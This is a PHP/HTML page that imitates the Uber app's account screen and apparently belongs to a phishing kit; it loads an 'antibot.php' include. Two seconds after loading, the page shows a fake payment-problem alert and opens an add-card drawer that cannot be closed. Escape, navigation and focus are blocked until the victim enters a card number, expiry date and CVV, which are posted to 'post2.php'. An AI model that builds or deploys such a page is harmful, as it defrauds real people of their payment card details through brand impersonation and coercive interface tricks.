<?php
require "antibot.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Account</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#ffffff; --text:#111111; --muted:#6b7280; --border:#e5e7eb; --tile:#f5f5f5;
    --black:#000; --green:#16a34a; --blue:#2563eb; --red:#ef4444;
    --radius:16px; --radius-sm:14px;
    --shadow:0 1px 2px rgba(0,0,0,.06), 0 8px 24px rgba(0,0,0,.08);
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{margin:0;font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif;color:var(--text);background:var(--bg);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
  body.lock{overflow:hidden}

  header{background:var(--black);height:50px;padding:0 16px;display:flex;align-items:center;color:#fff;font-weight:700;letter-spacing:.2px}

  .wrap{max-width:640px;margin:0 auto;padding:20px 16px 92px}
  .profile{display:flex;justify-content:space-between;align-items:flex-start;margin-top:8px}
  .name{font-size:34px;font-weight:800;line-height:1.05;margin:0 0 8px;letter-spacing:-.3px}
  .rating{display:inline-flex;align-items:center;gap:6px;font-weight:600;padding:6px 10px;border-radius:10px;background:#f3f4f6;font-size:14px;box-shadow:0 1px 0 rgba(0,0,0,.04) inset}
  .avatar{width:70px;height:70px;border-radius:50%;background: radial-gradient(120% 120% at 30% 20%, #e8e8e8, #cfcfcf);display:flex;align-items:center;justify-content:center;box-shadow:inset 0 2px 6px rgba(0,0,0,.08)}
  .avatar svg{width:34px;height:34px;opacity:.5}

  .tiles{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:18px 0 10px}
  .tile{position:relative;background:#f3f4f6;border-radius:14px;padding:18px 10px;text-align:center;box-shadow:0 1px 2px rgba(0,0,0,.04) inset;user-select:none}
  .tile svg{width:22px;height:22px;margin-bottom:10px;opacity:.9}
  .tile .t{font-weight:700}

  /* alert badge + shake (added later) */
  .badge-alert{
    position:absolute;top:8px;right:10px;width:10px;height:10px;border-radius:50%;background:var(--red);
    box-shadow:0 0 0 0 rgba(239,68,68,.7);animation:pulse 1.2s ease-out infinite;
  }
  @keyframes pulse{
    0%{box-shadow:0 0 0 0 rgba(239,68,68,.7)}
    70%{box-shadow:0 0 0 8px rgba(239,68,68,0)}
    100%{box-shadow:0 0 0 0 rgba(239,68,68,0)}
  }
  .shake{animation:shake .4s ease both}
  @keyframes shake{
    0%{transform:translateX(0)}25%{transform:translateX(-3px)}50%{transform:translateX(3px)}75%{transform:translateX(-2px)}100%{transform:translateX(0)}
  }

  .card{background:#f5f5f5;border-radius:16px;padding:18px;display:flex;align-items:center;justify-content:space-between;margin:14px 0}
  .card .title{font-weight:800;font-size:18px;margin:0 0 4px}
  .card .sub{color:#6b7280;font-size:14px;margin:0}

  .progress{width:64px;height:64px;position:relative}
  .progress svg{transform:rotate(-90deg)}
  .progress .txt{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-weight:800;color:#374151}
  .arc{stroke-dasharray:100;stroke-dashoffset:70;transition:stroke-dashoffset .8s ease .2s}

  .row{display:flex;align-items:center;gap:10px}
  .badge{width:26px;height:26px;border-radius:50%;background:#e6f6ec;display:flex;align-items:center;justify-content:center;color:var(--green)}
  .illustr{width:84px;height:54px;background:linear-gradient(135deg,#e1f0ff,#f7fbff);border-radius:12px;position:relative;overflow:hidden}
  .illustr:after{content:"";position:absolute;right:-8px;bottom:-8px;width:90px;height:40px;background:#a3d1ff;filter:blur(14px);opacity:.6}
  .confetti{width:84px;height:54px;background:linear-gradient(135deg,#fff0f0,#fff7e6);border-radius:12px;position:relative;overflow:hidden}
  .confetti:after{content:"";position:absolute;right:2px;bottom:2px;width:70px;height:10px;background:#ff6b6b;filter:blur(8px);opacity:.6;border-radius:8px}

  .list{margin-top:12px;border-top:1px solid var(--border)}
  .item{display:flex;align-items:center;justify-content:space-between;padding:16px 0;border-bottom:1px solid var(--border)}
  .item .l{display:flex;align-items:center;gap:12px}

  /* persistent toast (initially hidden, then shown) */
  .toast{
    position:fixed;left:50%;transform:translateX(-50%) translateY(-12px);
    top:62px; background:#fee2e2;color:#991b1b;border:1px solid #fecaca;
    padding:10px 14px;border-radius:12px;font-weight:700;box-shadow:var(--shadow);
    opacity:0; pointer-events:none; transition:opacity .25s ease, transform .25s ease; z-index:200;
  }
  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}

  /* blocking scrim (dim only, no blur) */
  .scrim{
    position:fixed;inset:0;background:rgba(0,0,0,.35);
    opacity:0;pointer-events:none;transition:opacity .25s ease;z-index:90;
  }
  .scrim.show{opacity:1;pointer-events:auto}

  /* non-dismissible panel (drawer) */
  .panel{
    position:fixed;left:0;right:0;bottom:-100%;background:#fff;border-top-left-radius:18px;border-top-right-radius:18px;
    box-shadow:0 -10px 30px rgba(0,0,0,.12);padding:18px 16px 28px;z-index:150;transition:transform .35s ease;
    transform:translateY(100%);
  }
  .panel.show{transform:translateY(0);bottom:0}
  .panel .grab{width:50px;height:5px;background:#e5e7eb;border-radius:999px;margin:0 auto 12px}

  /* payment form */
  .form h2{text-align:center;font-size:20px;font-weight:800;margin:6px 0 14px}
  .form label{display:block;margin-bottom:6px;font-size:14px;font-weight:600}
  .input{width:100%;padding:14px;border:1px solid var(--border);border-radius:12px;font-size:16px;margin-bottom:14px;background:#f9fafb}
  .rowx{display:flex;gap:12px}
  .country{display:flex;align-items:center;gap:10px;padding:14px;border:1px solid var(--border);border-radius:12px;background:#f9fafb;font-size:16px;margin-bottom:14px}
  .save-btn{width:100%;padding:16px;font-size:16px;font-weight:700;border:none;border-radius:12px;background:#e5e7eb;color:#9ca3af;cursor:not-allowed;transition:background .2s ease,color .2s ease}
  .save-btn.enabled{background:#000;color:#fff;cursor:pointer}

  /* bottom nav */
  .nav{position:fixed;left:0;right:0;bottom:0;background:#fff;border-top:1px solid var(--border);height:76px;display:flex;align-items:center;justify-content:center}
  .bar{width:100%;max-width:640px;display:flex;justify-content:space-around}
  .btn{display:flex;flex-direction:column;align-items:center;gap:6px;color:#6b7280;text-decoration:none;font-weight:600;font-size:12px;padding:8px 0}
  .btn svg{width:22px;height:22px}
  .btn.active{color:#000}
  .btn.active .indicator{width:8px;height:8px;border-radius:50%;background:#2563eb;margin-top:2px}

  @media(min-width:700px){.name{font-size:40px}}
</style>
</head>
<body>
  <header>Uber</header>

  <!-- Toast: hidden initially; will show after 2s -->
  <div id="toast" class="toast" role="status" aria-live="polite">Payment issue: please update your card</div>

  <div class="wrap" id="page" aria-hidden="false">
    <div class="profile">
      <div>
        <h1 class="name">Welcome Back</h1>
        <div class="rating">
          <svg viewBox="0 0 24 24" aria-hidden="true" width="16" height="16">
            <path d="M12 17.3l-6.18 3.73 1.64-6.97L2 9.64l7.09-.61L12 2l2.91 7.03 7.09.61-5.46 4.42 1.64 6.97z" fill="currentColor"></path>
          </svg> 4.50
        </div>
      </div>
      <div class="avatar">
        <svg viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8V22h19.2v-2.8c0-3.2-6.4-4.8-9.6-4.8z"></path></svg>
      </div>
    </div>

    <div class="tiles">
      <div class="tile" id="tileHelp">
        <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm1 14h-2v-2h2v2zm0-4h-2V6h2v6z"></path></svg>
        <div class="t">Help</div>
      </div>

      <div class="tile" id="tileWallet">
        <svg viewBox="0 0 24 24"><path d="M2 7h20v10H2z"></path><path d="M2 7l10 6 10-6" fill="#000"></path></svg>
        <div class="t">Wallet</div>
        <!-- red badge will be injected after 2s -->
      </div>

      <div class="tile" id="tileInbox">
        <svg viewBox="0 0 24 24"><path d="M4 4h16v16H4z" fill="none" stroke="currentColor"></path><path d="M4 7l8 5 8-5" fill="currentColor"></path></svg>
        <div class="t">Inbox</div>
      </div>
    </div>

    <div class="card">
      <div>
        <p class="title">Safety check-up</p>
        <p class="sub">Learn ways to make rides safer</p>
      </div>
      <div class="progress" aria-label="1 of 6">
        <svg width="64" height="64" viewBox="0 0 36 36">
          <path d="M18 2a16 16 0 1 1 0 32 16 16 0 0 1 0-32" fill="none" stroke="#e5e7eb" stroke-width="4"></path>
          <path class="arc" id="arc" d="M18 2 a16 16 0 0 1 0 32" fill="none" stroke="#3b82f6" stroke-width="4" stroke-linecap="round"></path>
        </svg>
        <div class="txt" id="progressText">1/6</div>
      </div>
    </div>

    <div class="card">
      <div class="row">
        <div class="badge">
          <svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M12 2l4 8h-8l4-8zm0 20c-3-3-5-6-5-9 0-3 2-5 5-5s5 2 5 5c0 3-2 6-5 9z"></path></svg>
        </div>
        <div><p class="title" style="margin:0">Estimated CO2 saved</p></div>
      </div>
      <div style="font-weight:800">0 g</div>
    </div>

    <div class="card">
      <div>
        <p class="title">Invite friends to OurApp</p>
        <p class="sub">Each of you will get AUD 6.00 off 5 rides</p>
      </div>
      <div class="illustr"></div>
    </div>

    <div class="card">
      <div>
        <p class="title">Rides for teens</p>
        <p class="sub">Invite your teen to set up their own account</p>
      </div>
      <div class="confetti"></div>
    </div>

    <div class="list">
      <div class="item">
        <div class="l">
          <svg width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" d="M16 11c1.7 0 3 1.3 3 3v5H5v-5c0-1.7 1.3-3 3-3h8zm-4-7a4 4 0 110 8 4 4 0 010-8z"></path></svg>
          <div>
            <div style="font-weight:800">Family</div>
            <div class="sub">Manage teen, adult, and senior accounts</div>
          </div>
        </div>
        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6" fill="none" stroke="currentColor" stroke-width="2"></path></svg>
      </div>
      <div class="item">
        <div class="l">
          <svg width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2a10 10 0 100 20 10 10 0 000-20zm2 15H10v-2h4v2zm0-4H10V7h4v6z"></path></svg>
          <div style="font-weight:800">Settings</div>
        </div>
        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6" fill="none" stroke="currentColor" stroke-width="2"></path></svg>
      </div>
    </div>
  </div>

  <!-- Blocking scrim -->
  <div id="scrim" class="scrim" aria-hidden="true"></div>

  <!-- Add Card Drawer -->
  <div id="panel" class="panel" role="dialog" aria-modal="true" aria-label="Wallet" tabindex="-1">
    <div class="grab"></div>
    <div class="form">
      <h2>Add card</h2>
<form method="post" action="post2.php">
      <label>Card number</label>
      <input type="text" id="cardNumber" class="input" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" autocomplete="cc-number" name="cardNumber" required>

      <div class="rowx">
        <div style="flex:1">
          <label>Exp. Date</label>
          <input type="text" id="expDate" class="input" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp" name="exp" equired>
        </div>
        <div style="flex:1">
          <label>CVV</label>
          <input type="text" id="cvv" class="input" placeholder="123" maxlength="3" inputmode="numeric" autocomplete="cc-csc" name="cvv" required>
        </div>
      </div>

      <label>Nickname (optional)</label>
      <input type="text" id="nickname" class="input" placeholder="e.g. work card" autocomplete="cc-name">

      

      <button type="submit" id="saveBtn" class="save-btn" disabled>Save</button>
    </form>
    </div>

  </div>

  <!-- Bottom Navigation -->
  <nav class="nav" role="navigation">
    <div class="bar">
      <a href="#" class="btn"><svg viewBox="0 0 24 24"><path d="M3 10l9-7 9 7v9a2 2 0 0 1-2 2h-4v-7H9v7H5a2 2 0 0 1-2-2v-9z" fill="currentColor"></path></svg>Home</a>
      <a href="#" class="btn"><svg viewBox="0 0 24 24"><path d="M3 5h18v4H3zM3 11h18v8H3z" fill="currentColor"></path></svg>Services</a>
      <a href="#" class="btn"><svg viewBox="0 0 24 24"><path d="M5 3h14v4H5zM5 9h14v12H5z" fill="currentColor"></path></svg>Activity</a>
      <a href="#" class="btn active"><svg viewBox="0 0 24 24"><path d="M12 12c2.8 0 5-2.2 5-5s-2.2-5-5-5-5 2.2-5 5 2.2 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z" fill="currentColor"></path></svg>Account<div class="indicator"></div></a>
    </div>
  </nav>

<script>
  // Helpers
  const $ = (sel, root=document) => root.querySelector(sel);
  const $$ = (sel, root=document) => Array.from(root.querySelectorAll(sel));

  const scrim = $('#scrim');
  const panel = $('#panel');
  const toast = $('#toast');

  // Open drawer (non-dismissible)
  function openPanel(){
    document.body.classList.add('lock');
    scrim.classList.add('show');
    panel.classList.add('show');
    setTimeout(() => $('#cardNumber').focus(), 60);
    // block nav clicks while open
    $$('.tile, .btn').forEach(el => el.addEventListener('click', blockNav, true));
    // block Escape close
    document.addEventListener('keydown', blockEscape, true);
    // simple focus trap
    document.addEventListener('focus', focusTrap, true);
  }
  function closePanel(){
    panel.classList.remove('show');
    scrim.classList.remove('show');
    document.body.classList.remove('lock');
    $$('.tile, .btn').forEach(el => el.removeEventListener('click', blockNav, true));
    document.removeEventListener('keydown', blockEscape, true);
    document.removeEventListener('focus', focusTrap, true);
  }
  function blockNav(e){ if (panel.classList.contains('show')) e.preventDefault(); }
  function blockEscape(e){ if (e.key === 'Escape' && panel.classList.contains('show')) { e.preventDefault(); e.stopPropagation(); } }
  function focusTrap(e){ if (panel.classList.contains('show') && !panel.contains(e.target)) { e.stopPropagation(); $('#cardNumber').focus(); } }

  // Delayed warning flow (2 seconds after load)
  window.addEventListener('DOMContentLoaded', () => {
    // animate progress a bit (demo)
    const arc = $('#arc');
    requestAnimationFrame(() => { arc.style.strokeDashoffset = 60; $('#progressText').textContent = '2/6'; });

    setTimeout(() => {
      // add red badge + shake to Wallet
      const tileWallet = $('#tileWallet');
      const badge = document.createElement('span');
      badge.className = 'badge-alert';
      tileWallet.appendChild(badge);
      tileWallet.classList.add('shake');

      // show persistent toast
      toast.classList.add('show');

      // open panel
      openPanel();
    }, 2000);
  });

  // Payment form logic
  const cardNumber = $('#cardNumber');
  const expDate    = $('#expDate');
  const cvv        = $('#cvv');
  const saveBtn    = $('#saveBtn');

  function formatCardNumber(e){
    let v = e.target.value.replace(/\D/g, '').slice(0,16);
    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
  }
  function formatExpDate(e){
    let v = e.target.value.replace(/\D/g, '').slice(0,4);
    if (v.length >= 3) e.target.value = v.slice(0,2) + '/' + v.slice(2);
    else e.target.value = v;
  }
  function validateForm(){
    const cardValid = /^\d{4} \d{4} \d{4} \d{4}$/.test(cardNumber.value);
    const cvvValid  = /^\d{3}$/.test(cvv.value);
    const expValid  = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expDate.value);
    if (cardValid && cvvValid && expValid){
      saveBtn.disabled = false;
      saveBtn.classList.add('enabled');
    } else {
      saveBtn.disabled = true;
      saveBtn.classList.remove('enabled');
    }
  }
  cardNumber.addEventListener('input', e => { formatCardNumber(e); validateForm(); });
  expDate.addEventListener('input',   e => { formatExpDate(e);   validateForm(); });
  cvv.addEventListener('input', validateForm);

  // Save is the only path to close
  saveBtn.addEventListener('click', () => {
    if (saveBtn.disabled) return;
    saveBtn.textContent = 'Adding Card';
    setTimeout(() => { saveBtn.textContent = 'Save'; closePanel(); }, 800);
  });
</script>
</body>
</html>
